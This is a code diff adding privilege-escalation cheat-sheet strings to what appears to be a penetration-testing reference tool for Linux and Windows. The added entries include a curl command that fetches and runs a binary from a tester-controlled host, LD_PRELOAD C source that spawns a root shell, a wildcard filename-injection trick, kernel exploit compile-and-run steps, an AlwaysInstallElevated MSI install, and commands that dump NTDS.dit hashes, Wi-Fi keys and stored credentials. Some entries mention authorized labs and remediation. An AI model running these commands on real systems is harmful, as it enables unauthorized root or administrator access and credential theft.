@@ -173,6 +173,15 @@ ls -lah /etc/cron*
 cat /etc/crontab
 `;
 
+  pspyMonitoring = `# On Kali: serve a trusted pspy build from the current directory
+python3 -m http.server {{LOCAL_PORT}} --bind 0.0.0.0
+
+# On the authorized Linux host: download and run the 64-bit build
+curl -fsS http://{{LOCAL_IP}}:{{LOCAL_PORT}}/pspy64 -o /tmp/pspy64
+chmod 700 /tmp/pspy64
+/tmp/pspy64 -pf -i 1000
+`;
+
   // =========================================================
   // WRITABLE FILES
   // =========================================================
@@ -350,6 +359,66 @@ sudo LD_PRELOAD=/tmp/shell.so /usr/bin/<binary>
 8. Kernel exploit
 `;
 
+  sudoStrategy = `
+sudo -l
+# Check allowed binaries in the sudo section of GTFOBins
+# Prioritize NOPASSWD, wildcard, SETENV, and env_keep entries
+`;
+
+  writablePriority = `
+/etc/sudoers
+/etc/passwd
+/etc/cron.d/*
+/etc/systemd/system/*
+~/.bashrc
+# Prioritize writable files that influence authentication or root execution
+`;
+
+  pathHijackValidation = `
+# Find scripts that may invoke commands without absolute paths
+grep -R "system\\|exec\\|popen" /etc 2>/dev/null
+grep -R "bash\\|sh" /opt /usr/local 2>/dev/null
+
+# Example weak command usage in a privileged script
+tar czf backup.tar.gz *
+cp /home/user/file /tmp/
+ls /tmp
+`;
+
+  wildcardAnalysis = `
+# Identify the privileged wildcard command and inspect its option handling
+sudo -l
+<binary> --help
+man <binary>
+
+# Search for options such as exec, checkpoint, files-from, and rsh
+# Derive filenames from supported flags; do not guess them
+touch -- "--files-from=/tmp/payload"
+sudo rsync -a * /backup/
+`;
+
+  sshKeyFollowUp = `
+cat ~/.ssh/authorized_keys
+# Check whether the key is accepted for other authorized users or hosts
+`;
+
+  ldPreloadSource = String.raw`// shell.c
+#include <stdio.h>
+#include <stdlib.h>
+
+void _init() {
+    setuid(0);
+    setgid(0);
+    system("/bin/bash");
+}`;
+
+  kernelExploitTransfer = `
+# Treat kernel exploits as a last resort; verify version and requirements first
+scp exploit.c user@TARGET:/tmp/
+gcc exploit.c -o exploit
+./exploit
+`;
+
   // =========================================================
   // WINDOWS PRIVESC
   // =========================================================
@@ -383,6 +452,23 @@ wmic product get name,version,vendor
 driverquery /v
 driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name','Start Mode',Path
 Get-WmiObject Win32_PnPSignedDriver | Select DeviceName,DriverVersion,Manufacturer
+`;
+
+  windowsUacChecks = String.raw`REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
+REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
+
+[environment]::OSVersion.Version
+cmd /c echo %PATH%`;
+
+  windowsEventLogs = `
+wevtutil qe Security /rd:true /f:text | Select-String "/user"
+Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4688 }
+`;
+
+  windowsStartupProcesses = `
+Get-CimInstance Win32_StartupCommand | Select Name,Command,Location,User | Format-List
+Get-Process -Id <PID>
+Get-Service | Where-Object { $_.DisplayName -like '*Service*' }
 `;
 
   windowsNetwork = `
@@ -429,6 +515,13 @@ doskey /history
 
 type C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
 `;
+
+  windowsCredentialArtifacts = String.raw`Get-PSReadLineOption | Select-Object HistorySavePath
+Get-Content (Get-PSReadLineOption).HistorySavePath
+
+Import-Clixml C:\scripts\pass.xml
+netsh wlan show profiles
+netsh wlan show profile NAME key=clear`;
 
   windowsInterestingFiles = `
 dir /s /b *.txt
@@ -491,6 +584,10 @@ sysprep.inf
   // SERVICES
   // =========================================================
 
+  windowsFilePermissions = String.raw`dir /q C:\path\to\file
+icacls "C:\path\to\file"
+Get-ChildItem -Path 'C:\path\to\file' | Select-Object Name,Directory,@{Name="Owner";Expression={(Get-Acl $_.FullName).Owner}}`;
+
   windowsServices = `
 sc query
 sc qc ServiceName
@@ -513,6 +610,21 @@ Select Name, State, StartMode, StartName
 icacls "C:\\Path\\To\\ServiceBinary.exe"
 
 sc qc ServiceName
+`;
+
+  windowsServicePermissions = String.raw`# Inspect a candidate service and its security descriptor
+sc.exe qc <SERVICE>
+sc.exe sdshow <SERVICE>
+
+# Check permissions on the service executable and its parent directory
+icacls "<SERVICE_BINARY>"
+icacls "<SERVICE_DIRECTORY>"
+
+# With Sysinternals AccessChk, inspect service permissions for the current user group
+accesschk64.exe -uwcqv "Users" <SERVICE>
+
+# Verify whether a low-privileged user can change configuration or write the binary.
+# A weak ACL alone is not enough: check the service account and restart/trigger conditions.
 `;
 
   windowsServiceRule = `
@@ -542,6 +654,20 @@ schtasks /query /fo TABLE
 schtasks /query /fo LIST /v
 
 schtasks /query /fo LIST /v > tasks.txt
+`;
+
+  windowsTaskContext = `
+Get-ScheduledTask "TaskName" | Select-Object TaskName,TaskPath,Author,Principal,Triggers,Actions
+`;
+
+  windowsAlwaysInstallElevated = String.raw`# Check both policy hives; both DWORD values must be 0x1 for this misconfiguration
+reg query "HKCU\Software\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
+reg query "HKLM\Software\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
+
+# Authorized disposable lab only: use a deliberately prepared test MSI
+msiexec /quiet /qn /i .\authorized-lab.msi
+
+# Remediation: disable the policy through Group Policy and verify both values are absent or 0.
 `;
 
   windowsTaskFiltering = `
@@ -607,6 +733,9 @@ reg save HKLM\\SAM sam
 reg save HKLM\\SYSTEM system
 `;
 
+  windowsNtdsAnalysis = String.raw`robocopy /B E:\Windows\NTDS .\ntds ntds.dit
+secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL`;
+
   windowsSecretsDump = `
 impacket-secretsdump -sam sam -system system LOCAL
 `;
@@ -618,6 +747,11 @@ impacket-psexec -hashes :NTHASH Administrator@IP
   // =========================================================
   // KERNEL
   // =========================================================
+
+  windowsExploitSuggester = `
+python windows-exploit-suggester.py --update
+python windows-exploit-suggester.py --database file.xls --systeminfo sysinfo.txt
+`;
 
   windowsKernel = `
 systeminfo
